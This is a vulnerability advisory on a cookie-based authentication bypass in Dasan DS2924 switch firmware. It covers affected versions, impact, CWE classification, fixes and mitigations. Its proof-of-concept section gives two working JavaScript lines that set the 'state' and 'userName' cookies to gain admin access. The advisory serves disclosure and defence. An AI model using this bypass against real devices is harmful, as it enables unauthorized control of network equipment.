# Dasan Switch DS2924 Authentication Bypass Vulnerability

## Description

The Dasan Switch DS2924 (firmware versions 1.01.18 and 1.02.00) is vulnerable to authentication bypass due to insecure cookie management on the `/cgi-bin/webctrl.cgi` endpoint and other paths. An attacker can manipulate the `state` and `userName` cookies, enabling unauthorized access to the device’s web control interface and potentially compromising the network device.

---

## Vendor Information

- **Vendor:** Dasan Networks
- **Vendor Homepage**: http://dasansmc.com/

---

## Affected Product(s)/Code Base

- **Product**: Dasan Switch DS2924
- **Firmware/Software Version Affected**:
  - **Model Name**: DS2924
  - **Firmware Version**: 1.01.18 & 1.02.00

---

## Vulnerable Endpoints

- `/cgi-bin/webctrl.cgi`
- `/`
- `/cgi-bin`

---

## Attack Type

- **Type**: Authentication Bypass
- **Classification**: Improper Authentication Implementation

---

## Impact

- **Severity**: High
- **Description**:
  - The Dasan Switch DS2924 devices (firmware versions 1.01.18 and 1.02.00) are vulnerable to authentication bypass due to improper session management.
  - By manipulating cookies, an attacker can bypass the login process entirely and gain unauthorized access to the device's web control interface.
  - This vulnerability potentially allows attackers to control the network switch, configure settings, or perform other malicious actions on the network infrastructure.

---

## Affected Component(s)

- **Authentication Mechanism** (Weak Cookie-Based Authentication)

---

## Attack Vector(s)

- **Access Method**: Manipulate cookies or run a script to set cookies in the browser.
- **Authentication Requirement**: None (Attacker bypasses authentication via cookies).
- **Exploit Complexity**: Low

---

## Proof of Concept (PoC)

### Exploit: Authentication Bypass via Cookie Manipulation

#### Steps to Reproduce:

1. Open a web browser.
2. Go to the login page of the Dasan Switch DS2924 interface (replace `<target-ip>` with the device's IP address):
   ```
   http://<target-ip>/cgi-bin/webctrl.cgi
   ```
3. In the browser's developer console, run the following JavaScript to bypass authentication:
   ```javascript
   document.cookie = "state=login";
   document.cookie = "userName=admin";
   ```
4. Refresh the page or access the management interface directly at:
   ```
   http://<target-ip>/
   ```
5. The attacker will have admin-level access to the device without logging in.

---

### PoC Video

https://github.com/user-attachments/assets/b85f1d3f-7af4-44af-b142-4bca25603dc1

---

## Vulnerability Type Info

- **Vulnerability Type**:
  - Authentication Bypass (Cookie-Based)
- **CWE-ID**:
  - [CWE-306](https://cwe.mitre.org/data/definitions/306.html) - Missing Authentication for Critical Function
  - [CWE-287](https://cwe.mitre.org/data/definitions/287.html) - Improper Authentication
- **Definition**:
  - The attacker is able to bypass authentication by setting the `state` and `userName` cookies to `login` and `admin`, respectively, without needing to enter any valid credentials.

---

## Impact Info

- **Impact Type**:
  - **Unauthorized Access**: The attacker gains access to the administrative functions of the device.
  - **Privilege Escalation**: The attacker is granted admin-level access without proper authentication.
  - **Potential for Malicious Activity**: The attacker can reconfigure the device or perform actions that can disrupt network operations.

---

## Suggested Fixes

### Implement Secure Session Management

- Ensure that the device validates authentication on every request and not only based on cookies.
- Implement more secure session tokens and access control mechanisms that are not easily manipulated via cookies.

### Use Strong Authentication for Critical Endpoints

- All management and configuration endpoints, such as `/cgi-bin/webctrl.cgi`, should require proper authentication via username/password.

### Encrypt Cookies

- Cookies should be securely encrypted and not contain sensitive session information such as `userName` or `state`.

---

## Mitigation & Workarounds

Until a patch is released, administrators should:

- Restrict access to the management interface by IP filtering or use VPNs.
- Disable remote access or limit it to trusted devices.
- Monitor for unauthorized sessions or abnormal access patterns.

